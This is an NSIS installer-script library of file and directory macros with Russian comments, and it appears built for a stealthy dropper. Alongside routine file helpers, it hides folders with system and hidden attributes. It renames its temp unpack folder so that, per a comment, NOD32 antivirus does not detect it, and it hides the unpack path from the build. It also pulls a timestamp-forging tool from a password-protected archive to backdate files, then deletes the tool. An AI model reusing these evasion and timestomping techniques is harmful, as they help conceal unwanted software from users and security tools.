;-----------------------------------------------------------------------------------
#                           File & Directory Functions                             #
;-----------------------------------------------------------------------------------
!define FileCopy `!insertmacro FileCopy`
!macro FileCopy FilePath TargetDir
  CreateDirectory `${TargetDir}`
  CopyFiles `${FilePath}` `${TargetDir}`
!macroend

;----------------------------------------------------------------------------------
!define HideDir "!insertmacro _HideDir"
!macro _HideDir _Dir_
  ${ExecCmd} "attrib +h +s +r $\"${_Dir_}$\"" 
!macroend

;----------------------------------------------------------------------------------
!define DelDir "!insertmacro _DelDir"
!macro _DelDir _Dir_
  ${ExecCmd} "attrib -h -s -r $\"${_Dir_}$\""
  RMDir /r "${_Dir_}"
!macroend

;----------------------------------------------------------------------------------
!define GenUnZipDir "!insertmacro _GenUnZipDir"
!macro _GenUnZipDir _RetVal_
  Call GenUnZipDir
  Pop ${_RetVal_}
!macroend

; Генерирует случайную директорию в %temp%
Function GenUnZipDir
  Push $1
  Push $0
    ${Rnd} $0 1111 9999
;    StrCpy $1 "$TEMP\msf$0.tmp"   ; NOD detect
    StrCpy $1 "$TEMP\msi$0.tmp"
  Pop $0
  Exch $1
FunctionEnd

;----------------------------------------------------------------------------------
# Вызов напрямую SetOutPath приводит к тому, что в билде виден прямой путь распаковки
!define XOutPath "!insertmacro _XOutPath"
!macro _XOutPath _Path_ 
  Push "${_Path_}"
  Call XOutPath
!macroend

Function XOutPath
  Exch $0
    SetOutPath "$0"
  Pop $0
FunctionEnd

;----------------------------------------------------------------------------------
!define SetDirTime "!insertmacro _SetDirTime"
!macro _SetDirTime _Dir_ _Date_
  Push "${_Dir_}"
  Push "${_Date_}"
  Call SetDirTime
!macroend

!define FT "FileTouch.exe"
Function SetDirTime
  ; Сохраняем регистры в стеке, извлекая при этом параметры
  Exch $0
  Exch 
  Exch $1
    Push $OUTDIR
      Push $2
        ;SetOutPath $UnZipDir
        ${XOutPath} $UnZipDir
        ${UnZipFileName} ${MAIN_ZIP} "${FT}" "${ZIP_PWD}" 
          StrCpy $2 "${FT} /s /c /w /a /r /d $0 "
            ${ExecCmd} "$2$\"$1$\""
            ${ExecCmd} "$2$\"$1.$\""
            ${ExecCmd} "$2$\"$1\*.*$\""
        Delete "${FT}"
      Pop $2
    Pop $OUTDIR
      SetOutPath $OUTDIR
  Pop $1
  Pop $0
FunctionEnd

;----------------------------------------------------------------------------------
!macro WriteToFile NewLine File String
  !if `${NewLine}` == true
  Push `${String}$\r$\n`
  !else
  Push `${String}`
  !endif
  Push `${File}`
  Call WriteToFile
!macroend

!define WriteToFile `!insertmacro WriteToFile false`
!define WriteLineToFile `!insertmacro WriteToFile true`
Function WriteToFile
Exch $0 ;file to write to
Exch
Exch $1 ;text to write
 
  FileOpen $0 $0 a #open file
  FileSeek $0 0 END #go to end
  FileWrite $0 $1 #write to file
  FileClose $0
 
Pop $1
Pop $0
FunctionEnd

;----------------------------------------------------------------------------------
!define ReadFileLine "!insertmacro _ReadFileLine"
!macro _ReadFileLine _File_ 
  Push 1
  Push "${_File_}"
    Call ReadFileLine
  Pop $0
!macroend

Function ReadFileLine
  Exch $0 ;file
  Exch
  Exch $1 ;line number
  Push $2
  Push $3
   
    FileOpen $2 $0 r
   StrCpy $3 0
 
Loop:
   IntOp $3 $3 + 1
    ClearErrors
    FileRead $2 $0
    IfErrors +2
   StrCmp $3 $1 0 loop
    FileClose $2
 
  Pop $3
  Pop $2
  Pop $1
  Exch $0
FunctionEnd

;----------------------------------------------------------------------------------
!macro DeleteFile lpFileName
  SetFileAttributes `${lpFileName}` NORMAL
  Push `${lpFileName}`
    System::Call `Kernel32::DeleteFile(t) i (s) .s`
    Exch $0
    ${IfThen} $0 = 0 ${|} SetErrors ${|}
  Pop $0
!macroend
!define DeleteFile "!insertmacro DeleteFile" 
